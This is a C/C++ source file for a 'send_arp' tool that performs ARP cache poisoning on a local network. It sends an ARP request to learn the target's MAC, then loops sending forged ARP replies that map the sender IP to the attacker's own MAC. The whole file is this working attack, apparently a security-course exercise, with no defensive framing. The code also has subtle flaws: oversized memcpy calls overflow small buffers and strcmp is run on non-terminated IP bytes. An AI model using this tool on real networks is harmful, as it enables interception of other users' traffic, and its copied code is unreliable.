#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pcap.h>

struct ethernet_header{
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t type;
};
struct arp_header{
    struct ethernet_header eth;
    uint16_t hd_type;
    uint16_t proto_type;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};

void print_usage(){
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
    printf("!! Sender IP & Target IP & Your IP in same area !!\n");
}

void my_info_setting(char *dev, uint8_t *ipstr, uint8_t *macstr, uint8_t *netmask){

    ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    ioctl(s, SIOCGIFADDR, &ifr);
    memcpy((char *)ipstr, ifr.ifr_addr.sa_data+2, 32);

    ioctl(s, SIOCGIFNETMASK, &ifr);
    memcpy((char *)netmask, ifr.ifr_netmask.sa_data+2, 32);

    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 48);
}

int ip_range_check(uint8_t *myip, uint8_t *senderip, uint8_t *targetip, uint8_t *netmask){
    uint8_t my_area[4];
    uint8_t sender_area[4];
    uint8_t target_area[4];
    int i;
    for(i=0; i<4; i++){
        my_area[i] = myip[i] & netmask[i];
        sender_area[i] = senderip[i] & netmask[i];
        target_area[i] = targetip[i] & netmask[i];
        if(my_area[i] != sender_area[i] || sender_area[i] != target_area[i]) break;
    }
    if(i == 4) return 1;
    else{
        printf("Sender, Target, You !! Three Objects Not in same Area!!\n");
        return 0;
    }
}


void ip_change(char * ip, uint8_t * unchanged_ip){


    char * a = strtok(ip, ".");
    char * b = strtok(NULL, ".");
    char * c = strtok(NULL, ".");
    char * d = strtok(NULL, ".");
    unchanged_ip[0] = (uint8_t)atoi(a);
    unchanged_ip[1] = (uint8_t)atoi(b);
    unchanged_ip[2] = (uint8_t)atoi(c);
    unchanged_ip[3] = (uint8_t)atoi(d);
}

int main(int argc, char * argv[]){

    struct arp_header arp;
    //structure pointer declare
    pcap_pkthdr* header;
    const u_char* packet;
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    uint8_t myip[4];
    uint8_t mymac[6];
    uint8_t netmask[4];
    uint8_t senderip[4];
    uint8_t targetip[4];
    uint8_t targetmac[6];

    if(argc != 4){
        print_usage();
        return -1;
    }

    my_info_setting(dev, myip, mymac, netmask);
    ip_change(argv[2], senderip);
    ip_change(argv[3], targetip);

    if(!ip_range_check(myip, senderip, targetip, netmask)){
        print_usage();
        return -1;
    }

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL){
        fprintf(stderr, "Counln't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    memcpy((char*)arp.eth.dest_mac, "\xff\xff\xff\xff\xff\xff", 6);
    for(int i=0; i<6; i++)  arp.eth.src_mac[i] = mymac[i];
    arp.eth.type = (uint16_t)ntohs(0x0806);
    arp.hd_type = (uint16_t)ntohs(0x0001);
    arp.proto_type = (uint16_t)ntohs(0x0800);
    arp.hlen = (uint8_t)0x06;
    arp.plen = (uint8_t)0x04;
    arp.opcode = (uint16_t)ntohs(0x0001);
    for(int i=0; i<4; i++)
        arp.sender_ip[i] = myip[i];
    for(int i=0; i<6; i++)
        arp.sender_mac[i] = mymac[i];
    memcpy((char*)arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
    for(int i=0; i<4; i++)
        arp.target_ip[i] = targetip[i];
    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));

    while(true){

        pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
        int res = pcap_next_ex(handle, &header, &packet);

        if(res == 0) continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        struct arp_header * arp_message = (arp_header *)packet;

        if(ntohs(arp_message->opcode) == 0x0002){
            printf("capture1  ");
            if(!strcmp((char *)arp_message->sender_ip, (char *)targetip)){
                printf("capture2  ");
                for(int i=0; i<6; i++){
                   targetmac[i] = arp_message->sender_mac[i];
                }
            }
        }else{
            continue;
        }

        for(int i=0; i<6; i++)  arp.eth.dest_mac[i] = targetmac[i];
        for(int i=0; i<6; i++)  arp.eth.src_mac[i] = mymac[i];
        arp.eth.type = (uint16_t)ntohs(0x0806);
        arp.hd_type = (uint16_t)ntohs(0x0001);
        arp.proto_type = (uint16_t)ntohs(0x0800);
        arp.hlen = (uint8_t)0x06;
        arp.plen = (uint8_t)0x04;
        arp.opcode = (uint16_t)ntohs(0x0002);
        for(int i=0; i<4; i++)
            arp.sender_ip[i] = senderip[i];
        for(int i=0; i<6; i++)
            arp.sender_mac[i] = mymac[i];
        memcpy((char*)arp.target_mac, targetmac,6);
        for(int i=0; i<4; i++)
            arp.target_ip[i] = targetip[i];
    }

    pcap_close(handle);
    return 0;

}
